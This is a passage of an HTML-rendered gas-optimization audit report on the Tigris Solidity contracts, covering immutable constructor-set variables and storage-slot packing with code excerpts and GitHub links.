class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetsIndex</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userPaid</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">268</span><span class=\"mtk1\">       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">userDebt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L265-L269</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"88\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Position</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[]) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_assetOpenPositions</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_assetOpenPositionsIndexes</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[]) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_limitOrders</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// List of limit order nft ids per asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_limitOrderIndexes</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// Keeps track of asset -&gt; id -&gt; array index</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">31</span><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">        </span><span class=\"mtk3\">// Funding</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">int256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fundingDeltaPerSec</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">34</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">int256</span><span class=\"mtk1\">))) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accInterestPerOi</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lastUpdate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">int256</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">initId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">longOi</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shortOi</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Position.sol#L24-L38</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StableVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenIndex</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/StableVault.sol#L29-L30</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isNode</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">        </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minPositionSize</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">:       </span><span class=\"mtk11\">mapping</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bool</span><span class=\"mtk1\">) </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">allowedMargin</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L17-L19</p>\n<h2 id=\"g02--state-variables-only-set-in-the-constructor-should-be-declared-immutable\" style=\"position:relative;\"><a href=\"#g02--state-variables-only-set-in-the-constructor-should-be-declared-immutable\" aria-label=\"g02  state variables only set in the constructor should be declared immutable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑02]  State variables only set in the constructor should be declared <code>immutable</code></h2>\n<p>Avoids a Gsset (<strong>20000 gas</strong>) in the constructor, and replaces the first access in each transaction (Gcoldsload - <strong>2100 gas</strong>) and each access thereafter (Gwarmacces - <strong>100 gas</strong>) with a <code>PUSH32</code> (<strong>3 gas</strong>). </p>\n<p>While <code>string</code>s are not value types, and therefore cannot be <code>immutable</code>/<code>constant</code> if not hard-coded outside of the constructor, the same behavior can be achieved by making the current contract <code>abstract</code> with <code>virtual</code> functions for the <code>string</code> accessors, and having a child contract override the functions with the hard-coded implementation-specific values.</p>\n<p><em>There are 7 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit trading (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">35</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">trading</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_trading</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit pairsContract (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">36</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">pairsContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPairsContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pairsContract</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit referrals (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">referrals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IReferrals</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_ref</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit position (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">:           </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_position</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L35</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit pairsContract (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">151</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">pairsContract</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPairsContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pairsContract</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit position (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">149</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">position</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosition</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_position</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit gov (constructor)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">150</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">gov</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IGovNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_gov</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L151</p>\n<h2 id=\"g03--state-variables-can-be-packed-into-fewer-storage-slots\" style=\"position:relative;\"><a href=\"#g03--state-variables-can-be-packed-into-fewer-storage-slots\" aria-label=\"g03  state variables can be packed into fewer storage slots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑03]  State variables can be packed into fewer storage slots</h2>\n<p>If variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (<strong>20000 gas</strong>). Reads of the variables can also be cheaper.</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingExtension</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 9 slots instead of the current 10:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):validSignatureTimer, mapping(32):isNode, mapping(32):minPositionSize, mapping(32):allowedMargin, uint256(32):maxGasPrice, address(20):trading, bool(1):chainlinkEnabled, bool(1):paused, address(20):pairsContract, address(20):referrals, address(20):position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trading</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/TradingExtension.sol#L13</p>\n<h2 id=\"g04--structs-can-be-packed-into-fewer-storage-slots\" style=\"position:relative;\"><a href=\"#g04--structs-can-be-packed-into-fewer-storage-slots\" aria-label=\"g04  structs can be packed into fewer storage slots permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑04]  Structs can be packed into fewer storage slots</h2>\n<p>Each slot saved can avoid an extra Gsset (<strong>20000 gas</strong>) for the first setting of the struct. </p>\n<p>Subsequent reads as well as writes have smaller gas savings.</p>\n<p><em>There are 6 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 10 slots instead of the current 11:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):id, uint256(32):amount, uint256(32):mintEpoch, uint256(32):mintTime, uint256(32):expireEpoch, uint256(32):pending, uint256(32):shares, uint256(32):period, address(20):owner, bool(1):expired, address(20):asset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">        </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Bond</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">owner</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintTime</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expireEpoch</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pending</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">period</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">expired</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">:       }</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L12-L24</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">IPosition</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 11 slots instead of the current 12:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):price, uint256(32):tpPrice, uint256(32):slPrice, uint256(32):orderType, uint256(32):id, int256(32):accInterest, address(20):trader, bool(1):direction, address(20):tigAsset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">7</span><span class=\"mtk1\">         </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Trade</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">8</span><span class=\"mtk1\">             </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">margin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">             </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 